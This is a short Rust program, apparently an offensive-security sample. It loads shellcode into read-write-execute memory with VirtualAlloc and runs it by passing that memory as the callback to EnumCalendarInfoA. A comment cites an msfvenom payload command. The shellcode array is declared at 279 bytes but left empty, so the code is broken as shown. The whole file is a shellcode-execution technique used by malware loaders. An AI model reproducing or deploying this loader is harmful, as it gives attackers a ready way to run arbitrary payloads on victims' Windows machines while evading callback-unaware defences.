use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows::Win32::Globalization::{EnumCalendarInfoA, CAL_SMONTHNAME1, ENUM_ALL_CALENDARS};
fn main() {

    // msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
    let shellcode: [u8; 279] = [];

    unsafe {
        let address = VirtualAlloc(None, shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        std::ptr::copy_nonoverlapping(shellcode.as_ptr() as _, address, shellcode.len());
        let _ = EnumCalendarInfoA(Some(std::mem::transmute(address)), 0x0400, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
    }
}
